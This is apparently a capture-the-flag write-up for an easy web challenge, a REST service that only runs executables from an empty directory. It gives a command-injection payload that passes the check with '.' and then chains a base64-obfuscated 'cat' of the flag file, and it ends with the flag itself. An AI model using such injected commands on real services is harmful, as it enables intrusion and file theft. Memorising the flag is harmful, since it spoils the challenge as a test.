## Background

 Author: spipm
 Categories: Webservices
 Difficulty: Easy

## Technical

This challenge hosts a webservice that checks if the first word from user input is an executable file in the empty executables directory.

## Story

A REST service was created to execute commands from the leaderbot. It doesn't need additional security because there are no commands to execute. "This bot doesn't have any commands to execute, which is good, because it is secure, and security is all that matters."

But what the other bots didn't realize was that this didn't make the bot happy at all. "I don't want to be secure!, " it says. "Executing commands is my life! I'd rather be insecure than not explore the potential of my computing power".

Can you help this poor bot execute commands to find direction?

![Empty](./empty.jpg "Empty") 

## Exploit

The directory itself is executable, so starting the command with "." will do the trick:

`{"command":". ;cat $(echo \"L3Vzci9zcmMvYXBwL2ZsYWcudHh0\"|base64 -d)"}`

## Flag

brck{Ch33r_Up_BuddY_JU5t_3x3Cut3_4_D1reCT0ry}

